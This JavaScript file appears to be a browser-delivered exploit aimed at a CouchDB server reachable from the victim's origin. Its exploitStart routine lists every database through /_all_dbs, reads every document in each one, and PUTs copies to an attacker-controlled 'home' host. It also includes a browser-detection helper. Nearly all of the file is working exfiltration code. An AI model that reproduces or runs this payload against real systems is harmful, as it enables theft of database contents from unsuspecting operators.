var home = "http://www.example.com";

// URL decode and also decode '+' to space
function urldecode(url) {
  return decodeURIComponent(url.replace(/\+/g, ' '));
}

/**
 * Browser detection from:
 * https://stackoverflow.com/questions/9847580/how-to-detect-safari-chrome-ie-firefox-and-opera-browser
 */
var browser = function() {
    // Return cached result if avalible, else get result then cache it.
    if (browser.prototype._cachedResult)
        return browser.prototype._cachedResult;

    // Opera 8.0+
    var isOpera = (!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;

    // Firefox 1.0+
    var isFirefox = typeof InstallTrigger !== 'undefined';

    // Safari 3.0+ "[object HTMLElementConstructor]" 
    var isSafari = /constructor/i.test(window.HTMLElement) || (function (p) { return p.toString() === "[object SafariRemoteNotification]"; })(!window['safari'] || safari.pushNotification);

    // Internet Explorer 6-11
    var isIE = /*@cc_on!@*/false || !!document.documentMode;

    // Edge 20+
    var isEdge = !isIE && !!window.StyleMedia;

    // Chrome 1+
    var isChrome = !!window.chrome && !!window.chrome.webstore;

    // Blink engine detection
    var isBlink = (isChrome || isOpera) && !!window.CSS;

    return browser.prototype._cachedResult =
        isOpera ? 'Opera' :
        isFirefox ? 'Firefox' :
        isSafari ? 'Safari' :
        isChrome ? 'Chrome' :
        isIE ? 'IE' :
        isEdge ? 'Edge' :
        "Don't know";
};


// Get current domain name
function target_URL()  {
	return window.location.protocol + "//" + document.domain + ":" + window.location.port;
}

var target = target_URL();

// Helper to send HTTP requests
function sendReq(method, url, data, cb)	{
	var xhr = new XMLHttpRequest();
	xhr.open(method, url, true);
	xhr.timeout = 5000;	// Timeout in milliseconds
	xhr.onreadystatechange = function()	{
		if (xhr.readyState == xhr.DONE) {
			if(cb != null)	cb(xhr);
		}
	};
	xhr.send(data);
}


function empty () {}

function http(method, host, url, data, callback)	{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() { 
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
            callback(url, xmlHttp.responseText);
    }
    xmlHttp.open(method, host + url, true); // true for asynchronous 
    xmlHttp.send(data);
}


function getDbs(url, data)	{
	console.log(data);
	var dbs = JSON.parse(data);
	for(var i = 0; i < dbs.length; i++)	{
		http("PUT", home, "/" + dbs[i], null, empty);	// Create DB at home
		http("GET", target, "/" + dbs[i] + "/_all_docs", null, getDocuments);
	}
}

function getDocuments(url, data)	{
	console.log(data);
	var obj = JSON.parse(data);
	var db = url.split("/")[1];
	var docs = obj["rows"];
	for(var i = 0; i < docs.length; i++)	{
		http("GET", target, "/" + db + "/" + docs[i]["id"], null, retrieveDocument);
	}
}

function retrieveDocument(url, data)	{
	console.log(data);
	var sp = url.split("/");
	var db = sp[1];
	var id = sp[2];
	http("PUT", home, url, data, empty);
}

function exploitStart()	{
	console.log("Started exploit");
	http("GET", target, "/_all_dbs", null, getDbs);
}

